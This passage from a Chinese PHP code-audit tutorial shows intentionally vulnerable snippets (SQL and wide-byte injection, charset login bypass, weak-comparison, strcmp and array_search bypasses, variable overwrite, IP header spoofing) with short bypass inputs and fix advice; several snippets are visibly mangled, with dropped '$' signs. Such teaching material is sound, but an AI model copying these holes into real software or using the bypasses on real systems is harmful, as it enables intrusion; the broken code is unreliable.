mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);</span><br><span class="line"></span><br><span class="line">漏洞代码2：</span><br><span class="line"></span><br><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接</span><br><span class="line">id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);</span><br><span class="line"></span><br><span class="line">if ($data - &gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    arr = data - &gt;fetch_all();</span><br><span class="line"></span><br><span class="line">    foreach(arr as a)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>即使使用了单引号保护，但是传入内容未过滤，导致SQL注入<br>修复建议：<br>参考代码1修复</p>
<ul>
<li>漏洞代码3：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接</span><br><span class="line">if (!empty($_POST[&apos;content&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    name = _POST[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">    content = _POST[&apos;content&apos;];</span><br><span class="line"></span><br><span class="line">    if (mysqli - &gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;发言成功&apos;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;发言失败&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>insert型注入，差不多的注入方式。<br>修复建议： 对SQL拼接时一定要单引号保护，整数型也不例外，并且传入的值要经过addslashes函数过滤。不过最好的方案还是用PDO预处理修复代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = addslashes(_POST[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">content = addslashes(_POST[&apos;content&apos;]);</span><br><span class="line"></span><br><span class="line">if(mysqli-&gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;))</span><br></pre></td></tr></table></figure>
<h3 id="5-2宽字节注入漏洞"><a href="#5-2宽字节注入漏洞" class="headerlink" title="5.2宽字节注入漏洞"></a>5.2宽字节注入漏洞</h3><h4 id="0x01漏洞背景-11"><a href="#0x01漏洞背景-11" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用charactersetclient设置值进行了一次编码</p>
<h4 id="0x02漏洞代码及分析-7"><a href="#0x02漏洞代码及分析-7" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接</span><br><span class="line"></span><br><span class="line">id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(&quot;SET NAMES &apos;gbk&apos;&quot;);</span><br><span class="line"></span><br><span class="line">data = mysqli-&gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);</span><br><span class="line"></span><br><span class="line">if($data-&gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">arr = data-&gt;fetch_all();</span><br><span class="line"></span><br><span class="line">foreach(arr as a)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行SET NAMES ‘gbk’之后会引起宽字节注入漏洞，绕过单引号达到注入效果<br>修复建议：<br>字符集编码设置成utf8<br>建议修复代码：<br>$mysqli-&gt;query(“SET NAMES ‘utf8’”);</p>
<h3 id="5-3字符集漏洞"><a href="#5-3字符集漏洞" class="headerlink" title="5.3字符集漏洞"></a>5.3字符集漏洞</h3><h4 id="0x01漏洞背景-12"><a href="#0x01漏洞背景-12" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>默认情况下，Mysql的字符集就是latin1，Mysql字段的字符集和php mysqli客户端设置的字符集不相同导致可能绕过登录等情况<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接</span><br><span class="line"></span><br><span class="line">if(!empty(_POST[&apos;username&apos;]) &amp;&amp; !empty(_POST[&apos;password&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">username = addslashes(_POST[&apos;username&apos;]);</span><br><span class="line"></span><br><span class="line">password = addslashes(_POST[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">data = mysqli-&gt;query(&quot;select * from user where username=&apos;username&apos; and password=&apos;password&apos;&quot;);</span><br><span class="line"></span><br><span class="line">if($data-&gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">arr = data-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">_SESSION[&apos;username&apos;] = arr[1];</span><br><span class="line"></span><br><span class="line">echo &apos;登录成功&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>例如管理员账号是admin，注册admin%c2，登录之后就是管理员权限了<br>修复建议：<br>将数据库字符集修改为utf8<br>参考文章：<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
<h3 id="6-1-hash比较绕过"><a href="#6-1-hash比较绕过" class="headerlink" title="6.1 hash比较绕过"></a>6.1 hash比较绕过</h3><h4 id="0x01漏洞背景-13"><a href="#0x01漏洞背景-13" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (isset(_GET[&apos;Username&apos;]) &amp;&amp; isset(_GET[&apos;password&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    $logined = true;</span><br><span class="line"></span><br><span class="line">    Username = _GET[&apos;Username&apos;];</span><br><span class="line"></span><br><span class="line">    password = _GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    if (!ctype_alpha($Username)) &#123;</span><br><span class="line"></span><br><span class="line">        $logined = false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!is_numeric($password)) &#123;</span><br><span class="line"></span><br><span class="line">        $logined = false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (md5(Username) != md5(password)) &#123;</span><br><span class="line"></span><br><span class="line">        $logined = false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($logined) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;successful&quot;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;login failed!&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。导致弱类型比较绕过<br>修复建议： 将 ==换成 ===<br>建议修复代码：<br>if (md5($Username) !== md5($password)) {</p>
<h3 id="6-2-json绕过"><a href="#6-2-json绕过" class="headerlink" title="6.2 json绕过"></a>6.2 json绕过</h3><h4 id="0x01漏洞背景-14"><a href="#0x01漏洞背景-14" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<h4 id="0x02漏洞代码及分析-8"><a href="#0x02漏洞代码及分析-8" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;message&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    message = json_decode(_POST[&apos;message&apos;]);</span><br><span class="line"></span><br><span class="line">    $key = &quot;*****&quot;;</span><br><span class="line"></span><br><span class="line">    if (message - &gt;key == key) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;~~~~&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>json_decode之后可以解析成布尔型，可以传入true绕过比较<br>修复建议：<br>将 ==换成 ===<br>建议修复代码：<br>if ($message-&gt;key === $key) {</p>
<h3 id="6-3-array-search绕过"><a href="#6-3-array-search绕过" class="headerlink" title="6.3 array_search绕过"></a>6.3 array_search绕过</h3><h4 id="0x01漏洞背景-15"><a href="#0x01漏洞背景-15" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<h4 id="0x02漏洞代码及分析-9"><a href="#0x02漏洞代码及分析-9" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (!is_array($_GET[&apos;test&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    exit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test = _GET[&apos;test&apos;];</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; count(test); i++) &#123;</span><br><span class="line"></span><br><span class="line">    if (test[i] === &quot;admin&quot;) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;error&quot;;</span><br><span class="line"></span><br><span class="line">        exit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    test[i] = intval(test[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (array_search(&quot;admin&quot;, $test) === 0) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;false&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>传入数组test[]=0可以绕过<br>修复建议：<br>将array_search第三个参数为true则就不能绕过<br>建议修复代码：<br>if (array_search(“admin”, $test, true) === 0) {</p>
<h3 id="6-4-strcmp绕过"><a href="#6-4-strcmp绕过" class="headerlink" title="6.4 strcmp绕过"></a>6.4 strcmp绕过</h3><h4 id="0x01漏洞背景-16"><a href="#0x01漏洞背景-16" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<h4 id="0x02漏洞代码及分析-10"><a href="#0x02漏洞代码及分析-10" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$password = &quot;*******&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    if (strcmp(_POST[&apos;password&apos;], password) == 0) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;Right!!!login success&quot;;</span><br><span class="line"></span><br><span class="line">        exit;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;Wrong password..&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>在PHP&lt;5.3的情况下，password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等修复建议： 不建议使用该函数</p>
<h3 id="7-1变量覆盖漏洞"><a href="#7-1变量覆盖漏洞" class="headerlink" title="7.1变量覆盖漏洞"></a>7.1变量覆盖漏洞</h3><h4 id="0x01漏洞背景-17"><a href="#0x01漏洞背景-17" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击</p>
<h4 id="0x02漏洞代码及分析-11"><a href="#0x02漏洞代码及分析-11" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$auth = &apos;0&apos;;</span><br><span class="line"></span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line">if ($auth == 1) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;private!&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;public!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>将可控的数组变量解析，导致变量覆盖漏洞<br>修复建议：<br>不要将用户可控的数据进行变量解析<br>漏洞代码2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$var=<span class="string">'init'</span>;</span><br><span class="line"></span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $var;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>parse_str将字符串解析成多个变量，导致变量覆盖漏洞<br>修复建议：<br>不要将用户可控的数据进行变量解析<br>漏洞代码3：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$magic_quotes_gpc = ini_get(<span class="string">'magic_quotes_gpc'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_FilterAll</span><span class="params">(fk, &amp;svar)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> cfg_notallowstr, cfg_replacestr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array($svar)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (svar <span class="keyword">as</span> k =&gt; $v) &#123;</span><br><span class="line"></span><br><span class="line">svar[k] = _FilterAll(fk, v);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cfg_notallowstr != <span class="string">''</span> &amp;&amp; preg_match(<span class="string">"#"</span> . cfg_notallowstr . <span class="string">"#i"</span>, $svar)) &#123;</span><br><span class="line"></span><br><span class="line">ShowMsg(<span class="string">" &#123;$fk&#125; has not allow words!"</span>, <span class="string">'-1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cfg_replacestr != <span class="string">''</span>) &#123;</span><br><span class="line"></span><br><span class="line">svar = preg_replace(<span class="string">'/'</span> . cfg_replacestr . <span class="string">'/i'</span>, <span class="string">"***"</span>, $svar);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$magic_quotes_gpc) &#123;</span><br><span class="line"></span><br><span class="line">svar = addslashes(svar);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $svar;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该片段取自于dedecms变量覆盖漏洞</p>
<h3 id="7-2-IP伪造漏洞"><a href="#7-2-IP伪造漏洞" class="headerlink" title="7.2 IP伪造漏洞"></a>7.2 IP伪造漏洞</h3><h4 id="0x01漏洞背景-18"><a href="#0x01漏洞背景-18" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>header里CLIENT-IP与X-FORWARDED-FOR都是可以用随意伪造的，当这些值未经处理直接用，会导致XSS、SQL注入等漏洞</p>
<h4 id="0x02漏洞代码及分析-12"><a href="#0x02漏洞代码及分析-12" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_FORWARDED'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        $ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        ip = _SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ip;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIP();</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>修复建议：<br>对传入内容进行addslashes和htmlspecialchars过滤<br>建议修复代码：<br>return addslashes($ip);</p>
<h3 id="7-3编码绕过"><a href="#7-3编码绕过" class="headerlink" title="7.3编码绕过"></a>7.3编码绕过</h3><h4 id="0x01漏洞背景-19"><a href="#0x01漏洞背景-19" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>一般程序带有全局addslashes过滤，但是后面又对传入内容进行解码，解码之后内容没有进行过滤</p>
